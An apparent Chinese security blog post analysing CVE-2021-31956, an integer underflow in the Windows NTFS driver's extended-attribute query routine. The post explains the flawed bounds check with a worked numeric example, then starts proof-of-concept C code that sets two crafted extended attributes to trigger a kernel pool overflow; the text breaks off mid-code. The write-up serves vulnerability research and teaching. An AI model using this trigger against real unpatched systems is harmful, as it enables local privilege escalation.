<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="CVE-2021-31956 ntfs漏洞分析与利用cve-2021-31956是发生在ntfs.sys模块的一个整形溢出导致的漏洞,可以完成提权,这个漏洞使用的利用方法非常值得学习,也对ntfs.sys的漏洞了解下. 1.ntfs组件介绍">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2021-31956 ntfs漏洞分析与利用">
<meta property="og:url" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Ash blog">
<meta property="og:description" content="CVE-2021-31956 ntfs漏洞分析与利用cve-2021-31956是发生在ntfs.sys模块的一个整形溢出导致的漏洞,可以完成提权,这个漏洞使用的利用方法非常值得学习,也对ntfs.sys的漏洞了解下. 1.ntfs组件介绍">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905154437852.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905155418739.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905160304485.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912100334095.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912101006846.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912140312734.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151147533.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151636023.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912151856702.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152049842.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152446900.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152602892.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912152743286.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912153108070.png">
<meta property="og:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230927154157158.png">
<meta property="article:published_time" content="2023-09-05T06:06:38.360Z">
<meta property="article:modified_time" content="2023-09-27T07:42:01.443Z">
<meta property="article:author" content="Ash">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905154437852.png">

<link rel="canonical" href="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2021-31956 ntfs漏洞分析与利用 | Ash blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ash blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ash">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ash blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2021-31956 ntfs漏洞分析与利用
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-09-05 14:06:38" itemprop="dateCreated datePublished" datetime="2023-09-05T14:06:38+08:00">2023-09-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-09-27 15:42:01" itemprop="dateModified" datetime="2023-09-27T15:42:01+08:00">2023-09-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="CVE-2021-31956-ntfs漏洞分析与利用"><a href="#CVE-2021-31956-ntfs漏洞分析与利用" class="headerlink" title="CVE-2021-31956 ntfs漏洞分析与利用"></a>CVE-2021-31956 ntfs漏洞分析与利用</h1><p>cve-2021-31956是发生在ntfs.sys模块的一个整形溢出导致的漏洞,可以完成提权,这个漏洞使用的利用方法非常值得学习,也对ntfs.sys的漏洞了解下.</p>
<h2 id="1-ntfs组件介绍"><a href="#1-ntfs组件介绍" class="headerlink" title="1.ntfs组件介绍"></a>1.ntfs组件介绍</h2><p>ntfs是微软开发的一种高性能,高可靠性的文件系统,用于管理和存储数据在windows操作系统中.</p>
<p>ntfs文件系统的底层由几个结构组成</p>
<p>VCB(Volume Control Block):ntfs系统的顶层控制块,用于控制文件系统中的卷.</p>
<p>FCB(FIle Control Block):用于控制文件的控制块</p>
<p>LCB(Log Control Block):用于控制ntfs的日志控制块,在系统故障和错误时,恢复文件系统状态</p>
<p>SCB(Stream Control Block):用于管理文件数据流,数据流包括元数据信息,大小,偏移,状态等</p>
<p>BCB(Buffer Control Block):用于管理缓存文件的数据块,提高文件读取和写入性能</p>
<p>ntfs的控制可以通过ioctl进行调用,在ntfs.sys中会通过NtfsUserFsRequest进行控制的分发.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">/* File */</span><br><span class="line">NtfsQueryStorageReserve();</span><br><span class="line">NtfsGetStatisticsEx();</span><br><span class="line">NtfsQueryUsnJournal();</span><br><span class="line">NtfsReadUsnJournal();</span><br><span class="line">NtfsReadFileUsnData();</span><br><span class="line">NtfsWriteUsnCloseRecord();</span><br><span class="line">NtfsSetSparse();</span><br><span class="line">NtfsQueryFileRegions();</span><br><span class="line">NtfsQueryAllocatedRanges();</span><br><span class="line">NtfsCreateOrGetObjectId();</span><br><span class="line">NtfsGetObjectId();</span><br><span class="line">NtfsDeleteObjectId();</span><br><span class="line">NtfsGetRepairState();</span><br><span class="line">NtfsWaitForRepair();</span><br><span class="line">NtfsQueryVolumeNumaInfo();</span><br><span class="line">NtfsCheckForSection();</span><br><span class="line">NtfsReadFromPlex();</span><br><span class="line">NtfsSetZeroOnDeallocate();</span><br><span class="line"></span><br><span class="line">/* Dir */</span><br><span class="line">NtfsQueryStorageReserve();</span><br><span class="line">NtfsGetStatisticsEx();</span><br><span class="line">NtfsQueryUsnJournal();</span><br><span class="line">NtfsReadUsnJournal();</span><br><span class="line">NtfsReadFileUsnData();</span><br><span class="line">NtfsWriteUsnCloseRecord();</span><br><span class="line">NtfsCreateOrGetObjectId();</span><br><span class="line">NtfsDeleteObjectId();</span><br><span class="line">NtfsGetRepairState();</span><br><span class="line">NtfsWaitForRepair();</span><br><span class="line">NtfsQueryVolumeNumaInfo();</span><br><span class="line"></span><br><span class="line">/* Volume */</span><br><span class="line">NtfsGetRetrievalPointerBase();</span><br><span class="line">NtfsQueryStorageReserve();</span><br><span class="line">NtfsGetStatisticsEx();</span><br><span class="line">NtfsSetRepairState();</span><br><span class="line">NtfsGetRepairState();</span><br><span class="line">NtfsQueryVolumeNumaInfo();</span><br><span class="line">NtfsGetVolumeData();</span><br><span class="line">NtfsIsVolumeDirty();</span><br><span class="line">NtfsMarkVolumeDirty();</span><br><span class="line">NtfsIsVolumeMounted();</span><br><span class="line">NtfsGetBootAreaInfo();</span><br><span class="line">NtfsReadFromPlex();</span><br><span class="line">NtfsSetExtendedDasdIo();</span><br><span class="line">NtfsGetMftRecord();</span><br><span class="line">NtfsDefineStorageReserve();</span><br><span class="line">NtfsDeleteStorageReserve();</span><br><span class="line">NtfsRepairStorageReserve();</span><br><span class="line">NtfsSetPersistentVolumeState();</span><br><span class="line">NtfsQueryPersistentVolumeState();</span><br><span class="line">NtfsPrefetchFile();</span><br></pre></td></tr></table></figure>

<p>在NTFS卷中,与文件相关的每个信息单位,如文件名,所有者,时间戳,内容,都作为<code>文件属性</code>,文件的数据也是属性,称为$Data.NTFS卷上有很多的属性.在本次分析的漏洞中,主要关注以下属性.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$EA 				Extended the attribute index 	扩展属性索引</span><br><span class="line">$EA_INFORMATION 	Extended attribute information  扩展属性信息</span><br></pre></td></tr></table></figure>



<h2 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2.漏洞分析"></a>2.漏洞分析</h2><p>CVE-2021-31956这个漏洞最初由卡巴斯基发现,漏洞位于模块NtfsQueryEaUserEaList中.</p>
<p>这个函数用于查询扩展属性信息,可以在ring3通过系统api进行调用.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwQueryEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PVOID            Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG            Length,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN          ReturnSingleEntry,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID            EaList,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG            EaListLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PULONG           EaIndex,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN          RestartScan</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>文件的扩展属性可以通过ZwSetEaFile进行设置</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">ZwSetEaFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  PVOID            Buffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ULONG            Length</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>ZwQueryEaFile的参数EaList,是调用者提供的一个FILE_FULL_EA_INFORMATION结构指针,用于指定要查询的扩展属性,可以为空.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905154437852.png" alt="image-20230905154437852"></p>
<p>它的结构如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_GET_EA_INFORMATION</span> &#123;</span><br><span class="line">  ULONG NextEntryOffset;</span><br><span class="line">  UCHAR EaNameLength;</span><br><span class="line">  CHAR  EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_GET_EA_INFORMATION, *PFILE_GET_EA_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>NextEntryOffset表示下一个FILE_GET_EA_INFORMATION 类型条目的偏移量.一个32位的无符号整数,如果缓冲区中有多个条目,则下一个FILE_GET_EA_INFORMATION条目位于该偏移量上,如果该条目后没有其他条目,则为0.实现必须使用该值来确定下一个条目的位置（如果缓冲区中有多个条目).</p>
<p>EaNameLength:表示EaName数组的长度</p>
<p>EaName:表示要查询的扩展属性名称的字符起始位置</p>
<p>FILE_GET_EA_INFORMATION 这个数据结构表示要通过FileFullEaInformation查询的明确属性列表,如果没有指定,则返回指定文件的全部扩展属性.</p>
<p>当缓冲区中出现多个FILE_GET_EA_INFORMATION数据元素时,每个数据元素必须以4个字节的边界对齐,为了对齐而插入的任何字节都应该设置为0.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905155418739.png" alt="image-20230905155418739"></p>
<p>FileFullEaInformation这个类用于查询文件扩展信息,当通过FILE_GET_EA_INFORMATION结构列表查询时,会返回FILE_FULL_EA_INFORMATION 结构列表.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_FILE_FULL_EA_INFORMATION</span> &#123;</span><br><span class="line"> 	ULONG NextEntryOffset;</span><br><span class="line"> 	UCHAR Flags;</span><br><span class="line"> 	UCHAR EaNameLength;</span><br><span class="line"> 	USHORT EaValueLength;</span><br><span class="line"> 	CHAR  EaName[<span class="number">1</span>];</span><br><span class="line">&#125; FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>同样的,当缓冲区有多个FILE_FULL_EA_INFORMATION 元素时,每个数据元素以4字节对齐,为了对齐而插入的任何字节都应该设置为0.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230905160304485.png" alt="image-20230905160304485"></p>
<p>NtfsQueryEaUserEaList函数的处理流程如下.</p>
<p>首先使用了循环获取需要查询的ealist中的成员,然后通过调用函数NtfsIsNameValid判断扩展属性名是否存在.</p>
<p>而后使用for循环遍历EaList,通过扩展属性名获取扩展信息,然后进行如下内存copy.</p>
<p>在copy之前做了如下判断,ea_block_size&lt;outBuflen-padding,防止溢出.</p>
<p>copy的大小:ea_block_size &#x3D; v20-&gt;EaValueLength + v20-&gt;EaNameLength + 9;计算出需要copy的大小.</p>
<p>copy的源数据:v20 &#x3D; (FILE_FULL_EA_INFORMATION *)((char *)ea_blocks_for_file + find_ea_offset);</p>
<p>copy的目标位置:然后将v16 &#x3D; (_DWORD *)(outBuf + padding + offset);作为copy的目标位置</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912100334095.png" alt="image-20230912100334095"></p>
<p>在copy完成后,运行到此处,判断ealist中是否还有其他成员,如果还有,将进行如下计算:</p>
<p>将缓冲区长度-(已经拷贝的长度+padding)</p>
<p>然后计算出padding&#x3D;((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912101006846.png" alt="image-20230912101006846"></p>
<p>在以上的流程中,涉及到溢出的判断为ea_block_size&lt;&#x3D;outBuflen-padding.</p>
<p>outBuflen:随着循环逐渐递减 outBufLen -&#x3D; ea_block_size + padding;表示outBuf剩余的长度.</p>
<p>padding:每次通过ea_block_size进行计算((ea_block_size + 3) &amp; 0xFFFFFFFC) - ea_block_size;进行4字节对齐.padding的长度</p>
<p>在这里,并没有看到outBuflen和padding的比较检查,而是直接相减然后与ea_block_size进行判断了</p>
<p>如果剩余的outBuflen小于padding的话,outBuflen-padding将会产生整数溢出,导致</p>
<p>ea_block_size&lt;&#x3D;outBuflen-padding处的检查直接被绕过.在memmove时,将会产生越界写.</p>
<p>而且outBuflen小于padding的这种情况,是有可能发生的.</p>
<p>我们构造2个扩展属性,并将outbuflen是这为0x12,第一个扩展属性为</p>
<p>EaNameLength&#x3D;0x3,EaValueLength&#x3D;0x6</p>
<p>第二个扩展属性为</p>
<p>EaNameLength&#x3D;0x4,EaValueLength&#x3D;0x64</p>
<p>将在此流程中进行如下计算:</p>
<p>第一次循环:</p>
<p>ea_block_size &#x3D; v20-&gt;EaValueLength + v20-&gt;EaNameLength + 9;</p>
<p>ea_block_size&#x3D;0x3+0x6+0x9&#x3D;0x12</p>
<p>溢出检查:ea_block_size&lt;&#x3D;outBuflen-padding.</p>
<p>第一次不需要对齐,当前padding为0</p>
<p>0x12&lt;&#x3D;0x12-0</p>
<p>而后计算下次对齐的padding,4字节对需要padding的值为2.</p>
<p>此时padding&#x3D;2</p>
<p>第二次循环</p>
<p>ea_block_size&#x3D;0x4+0x64+0x9&#x3D;0x73</p>
<p>溢出检查:0x73&lt;0-2,此时会发生溢出,检查将会被绕过.</p>
<p>此时在memmove时,会将0x73个字节的数据copy到0x12字节长度的缓冲区中,造成越界写.</p>
<p>而这块内存池,也是在它的上层函数NtfsCommonQueryEa中进行分配的一块分页内存池.</p>
<p><img src="/2023/09/05/CVE-2021-31956%20ntfs%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230912140312734.png" alt="image-20230912140312734"></p>
<h2 id="2-构造poc"><a href="#2-构造poc" class="headerlink" title="2.构造poc"></a>2.构造poc</h2><p>首先创建一个文件,然后按照上面分析的流程,设置2个扩展属性,进行查询</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">hFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;payload&quot;</span>,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;create the file failed\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> ERROR_HANDLE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">WriteFile</span>(hFile, <span class="string">&quot;This files has an optional .COMMENTS EA\n&quot;</span>,</span><br><span class="line">		<span class="built_in">strlen</span>(<span class="string">&quot;This files has an optional .COMMENTS EA\n&quot;</span>),</span><br><span class="line">		&amp;dwNumberOfBytesWritten, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	curEa = (PFILE_FULL_EA_INFORMATION)payLoad;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第一个扩展属性</span></span><br><span class="line">	curEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	curEa-&gt;EaNameLength = <span class="number">3</span>;</span><br><span class="line">	curEa-&gt;EaValueLength = <span class="number">6</span>;</span><br><span class="line">	<span class="comment">//align 4。</span></span><br><span class="line">	curEa-&gt;NextEntryOffset = (curEa-&gt;EaNameLength + curEa-&gt;EaValueLength + <span class="number">3</span> + <span class="number">9</span>) &amp; (~<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(curEa-&gt;EaName, TIGGER_EA_NAME, TIGGER_EA_NAME_LENGTH);</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(curEa-&gt;EaName + curEa-&gt;EaNameLength + <span class="number">1</span>, <span class="number">6</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//第二个扩展属性</span></span><br><span class="line">	curEa = (PFILE_FULL_EA_INFORMATION)((PUCHAR)curEa + curEa-&gt;NextEntryOffset);</span><br><span class="line">	curEa-&gt;NextEntryOffset = <span class="number">0</span>;</span><br><span class="line">	curEa-&gt;Flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	curEa-&gt;EaNameLength = <span class="number">4</span>;</span><br><span class="line">	curEa-&gt;EaValueLength = <span class="number">0x64</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(curEa-&gt;EaName, OVER_EA_NAME, OVER_EA_NAME_LENGTH);</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(curEa-&gt;EaName + curEa-&gt;EaNameLength + <span class="number">1</span>, <span class="number">0x64</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">	rc = <span class="built_in">NtSetEaFile</span>(hFile, &amp;eaStatus, payLoad, <span class="built_in">sizeof</span>(payLoad));</span><br><span class="line">	<span class="keyword">if</span> (rc != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span 